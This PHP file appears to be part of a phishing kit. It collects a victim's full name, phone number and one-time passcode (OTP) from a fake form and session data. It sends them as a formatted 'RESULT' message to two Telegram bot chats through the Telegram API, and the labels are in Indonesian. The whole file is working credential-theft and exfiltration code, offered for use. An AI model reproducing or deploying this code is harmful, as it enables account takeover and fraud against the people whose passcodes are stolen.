<?php
include "./telegram.php";
session_start();
$full_name = $_SESSION['full_name'];
$phone_number = $_SESSION['phone_number'];
$otp_code = $_POST['otp_code'];

$_SESSION['otp_code'] = $otp_code;
$message = "
===RESULT===( t.me/tampilanwebjimz )
( DATA | ".$phone_number." )

- Nama Lengkap : ".$full_name."
- No HP : ".$phone_number."
- Code OTP : ".$otp_code."
";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
sendMessage($id_telegram2, $message, $id_botTele2);
?>
